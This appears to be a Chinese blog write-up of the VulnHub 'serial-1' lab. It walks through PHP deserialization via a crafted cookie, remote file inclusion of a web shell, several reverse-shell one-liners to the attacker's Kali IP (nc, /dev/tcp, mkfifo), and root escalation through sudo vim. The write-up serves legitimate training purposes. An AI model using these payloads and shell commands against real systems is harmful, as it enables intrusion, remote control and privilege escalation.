## 一 前言

刚补充学习完了反序列化的pop链，因此拿了个php反序列化的靶场练练手，但发现这个靶场对于pop链分析的部分其实较为简单，但也学到了很多，尤其是对包含远程文件的理解又更深了。希望对新手们有所帮助，不对的地方欢迎大佬们斧正！

 **靶场：**<https://www.vulnhub.com/entry/serial-1,349/>

 **安装：** 这里我只选择关键的几个步骤截图，其他的你们一直按确认就可以了

**![1653839746_62939782d6967b0a24a5d.png!small?1653839747335](https://image.3001.net/images/20220529/1653839746_62939782d6967b0a24a5d.png!small?1653839747335)**![1653839790_629397aea3319f987baef.png!small?1653839790959](https://image.3001.net/images/20220529/1653839790_629397aea3319f987baef.png!small?1653839790959)![1653839866_629397fa423a481417e7b.png!small?1653839866609](https://image.3001.net/images/20220529/1653839866_629397fa423a481417e7b.png!small?1653839866609)![1653839921_629398311cc754ab9f04d.png!small?1653839921439](https://image.3001.net/images/20220529/1653839921_629398311cc754ab9f04d.png!small?1653839921439)

  

## 二 步骤

### 1 信息收集

扫描端口：nmap 192.168.8.178/24

发现有22端口，后面看要不要用到ssh远程登录

![1653880007_629434c797e9d2c74f127.png!small?1653880007621](https://image.3001.net/images/20220530/1653880007_629434c797e9d2c74f127.png!small?1653880007621)

扫描漏洞，没发现什么有用信息

![1653880067_629435033451db6c6997b.png!small?1653880067239](https://image.3001.net/images/20220530/1653880067_629435033451db6c6997b.png!small?1653880067239)

扫描目录，没发现什么

![1653880103_629435273d323974aab1b.png!small?1653880103361](https://image.3001.net/images/20220530/1653880103_629435273d323974aab1b.png!small?1653880103361)

换dirsearch -u [http://192.168.8.133/ ](http://192.168.8.133/)

发现路径：http://192.168.8.133/backup/

![1653880132_629435442e7605748e853.png!small?1653880132158](https://image.3001.net/images/20220530/1653880132_629435442e7605748e853.png!small?1653880132158)

### 2 发现漏洞并利用

访问网址，没有什么可用信息

![1653880482_629436a24063e11568b79.png!small?1653880482272](https://image.3001.net/images/20220530/1653880482_629436a24063e11568b79.png!small?1653880482272)

之后访问

![1653880467_62943693ac7b551c9d3ef.png!small?1653880467757](https://image.3001.net/images/20220530/1653880467_62943693ac7b551c9d3ef.png!small?1653880467757)

挨个点击发现有三个php文件，查看里面的内容，有可能是php反序列化漏洞

![1653880544_629436e08e5b9b86cd835.png!small?1653880544574](https://image.3001.net/images/20220530/1653880544_629436e08e5b9b86cd835.png!small?1653880544574)

打开index.php，有个$_cookie，回去index页面抓包

![1653880566_629436f6e914da86664ca.png!small?1653880566930](https://image.3001.net/images/20220530/1653880566_629436f6e914da86664ca.png!small?1653880566930)

![1653880607_6294371f3f5d9116a5e1e.png!small?1653880607293](https://image.3001.net/images/20220530/1653880607_6294371f3f5d9116a5e1e.png!small?1653880607293)

将cookiebase64解密之后，确实是序列化

![1653880636_6294373c8f545d83a09b5.png!small?1653880636704](https://image.3001.net/images/20220530/1653880636_6294373c8f545d83a09b5.png!small?1653880636704)

之后便是分析php文件，找pop链（感觉代码放这里看不明显，直接上截图）

cookie有值就直接反序列化，这里包含了uesr.class.php文件，去看一下

![1653883497_62944269b8ea3032606c0.png!small?1653883497750](https://image.3001.net/images/20220530/1653883497_62944269b8ea3032606c0.png!small?1653883497750)

uesr.class.php文件

![1653883946_6294442a2a012044b8ad1.png!small?1653883946246](https://image.3001.net/images/20220530/1653883946_6294442a2a012044b8ad1.png!small?1653883946246)

log.class.php

![1653883854_629443ce6c35b888bf01c.png!small?1653883854620](https://image.3001.net/images/20220530/1653883854_629443ce6c35b888bf01c.png!small?1653883854620)

分析完毕，那就要构造exp了，先前的序列化拿来分析下

    
    
    O:4:"User":2:{s:10:" User name";s:3:"sk4";s:9:" User wel";O:7:"Welcome":0:{}}  
    这里其实是有%00的，应该是这样的  
    O:4:"User":2:{s:10:"%00User%00name";s:3:"sk4";s:9:"%00User%00wel";O:7:"Welcome":0:{}}

因为 protected(受保护) 被序列化的时候属性值会变成%00*%00属性名，但是public序列化后是没有这个%00的

![1653884955_6294481b90f9c536e2919.png!small?1653884955857](https://image.3001.net/images/20220530/1653884955_6294481b90f9c536e2919.png!small?1653884955857)

构造exp，记住所有变量前用public修饰

    
    
    <?php
    
    class Log {
    public $type_log = "/etc/passwd";
    
    }
    
    class User {
    public $name;
    public $wel;
    
    function __construct($name) {
    $this->name = $name;
    $this->wel = new Log();
    }
    
    }
    $us = new User("sk4");
    
    print_r(serialize($us));
    
    ?>

得到
O:4:"User":2:{s:4:"name";s:3:"sk4";s:3:"wel";O:3:"Log":1:{s:8:"type_log";s:11:"/etc/passwd";}}

之后去base64编码之后，赋值给cookie，成功执行

![1653889924_62945b84bb67516a5a5b5.png!small?1653889925119](https://image.3001.net/images/20220530/1653889924_62945b84bb67516a5a5b5.png!small?1653889925119)

尝试看能不能远程包含

写个test.php文件,保存在www文件夹里面（访问该文件：[10.61.171.251/test.php](http://10.61.171.251/test.php)）

    
    
    <?php
    echo "11718826876281718";
    ?>

修改type_log的值，之后编码，改cookie，成功访问，证明可以远程包含

![1653890227_62945cb304de88573797a.png!small?1653890227156](https://image.3001.net/images/20220530/1653890227_62945cb304de88573797a.png!small?1653890227156)

![1653890144_62945c60b078704b7c762.png!small?1653890144823](https://image.3001.net/images/20220530/1653890144_62945c60b078704b7c762.png!small?1653890144823)

test.php改为命令执行代码

    
    
    <?php  
    system($_GET['x']);  
    ?>

发现一直报错显示无法执行空逗号，我那时候还在疑惑为什么不行，试了很久发现是包含文件是php形式的错，包含的文件会先自己进行解析（这里是test.php，会先按php进行解析），解析之后的内容再到包含文件的地方，按它那里的格式进行解析（这里是php文件，按php解析），因此
**这里test.php先解析的时候，$_GET['x']没有值，因此报错，而按txt解析的时候不会报这个错误，因为被当做字符串**

![1653890893_62945f4d75708be2b90a4.png!small?1653890893613](https://image.3001.net/images/20220530/1653890893_62945f4d75708be2b90a4.png!small?1653890893613)

将test.php换为test.txt，之后重新序列化，编码，写入cookie，参数，发现成功执行

![1653900332_6294842cd18bdbb106970.png!small?1653900333080](https://image.3001.net/images/20220530/1653900332_6294842cd18bdbb106970.png!small?1653900333080)

### 3 getshell

我尝试输了

/bin/nc 192.168.8.178 5555 -e /bin/bash

bash -i >& /dev/tcp/192.168.8.178/5555 0>&1

但是没有反弹shell

![1653901674_6294896a4a3c7cf489482.png!small?1653901674506](https://image.3001.net/images/20220530/1653901674_6294896a4a3c7cf489482.png!small?1653901674506)

之后试了该命令：（192.168.8.178 kali的ip地址）

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.8.178 5555
>/tmp/f

然后url编码

![1653906994_62949e32302c722c0b7bf.png!small?1653907001374](https://image.3001.net/images/20220530/1653906994_62949e32302c722c0b7bf.png!small?1653907001374)

先在kali开启端口监听： nc -lvp 5555

然后在burp修改x参数，成功反弹shell

![1653907104_62949ea055b264a7cdbbd.png!small?1653907104476](https://image.3001.net/images/20220530/1653907104_62949ea055b264a7cdbbd.png!small?1653907104476)

![1653907373_62949fadb7256f339c759.png!small?1653907373799](https://image.3001.net/images/20220530/1653907373_62949fadb7256f339c759.png!small?1653907373799)

这里开了22端口，先试试看能不能爆破密码，失败了很正常

![1653922171_6294d97bad6cf7969a182.png!small?1653922172008](https://image.3001.net/images/20220530/1653922171_6294d97bad6cf7969a182.png!small?1653922172008)

偶然下发现根目录下有个特殊文件，里面保存sk4用户的密码

![1653911430_6294af86b25ab5cad6542.png!small?1653911430850](https://image.3001.net/images/20220530/1653911430_6294af86b25ab5cad6542.png!small?1653911430850)

之后用su sk4成功切换用户

![1653911558_6294b006863d6af1f49a4.png!small?1653911558646](https://image.3001.net/images/20220530/1653911558_6294b006863d6af1f49a4.png!small?1653911558646)

### 4 提权

输入sudo -l 查看是否能执行全部命令，发现vim有(all)nopassword

![1653911639_6294b0570d76133a4c930.png!small?1653911639102](https://image.3001.net/images/20220530/1653911639_6294b0570d76133a4c930.png!small?1653911639102)

输入sudo vim之后按:!bash回车

可以看到提权到root

![1653911755_6294b0cbea4993a79f7e7.png!small?1653911756123](https://image.3001.net/images/20220530/1653911755_6294b0cbea4993a79f7e7.png!small?1653911756123)

## 三 补充的知识点

1 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.8.178 5555
>/tmp/f

 **解释：**

 **rm /tmp/f** 删除文件/tmp/f

（/tmp目录主要包含临时需要的文件，它被不同的程序用来创建锁文件和临时存储数据）

 **mkfifo /tmp/f** 命名为/tmp/f的管道

2 命名管道：

| 为管道，是两个进程之间的通信通道

  * 例如：ls | grep txt 
  * ls和grep由|分开，管道创建了程序之间的通信通道，将ls的输出作为输入传给grep

由mkfifo创建出来的就是一个命名管道

  * 例如：mkfifo pipe2
  * pipe2就是一个命名管道。

使用命名管道( **可以将输出信道化到不同终端** )

只有先将ls 重定向到管道，之后cat<pipe2才可以输出内容，本质上可以将命名管道看作是一个暂时保存内容的文件

![1653914425_6294bb3910b878a1162b4.png!small?1653914425307](https://image.3001.net/images/20220530/1653914425_6294bb3910b878a1162b4.png!small?1653914425307)

## 四 总结

先端口扫描，目录扫描，之后查找pop链利用反序列化漏洞实现远程文件包含，get低权限的shell之后，利用sudo vim提权，又学到一种提权方式。

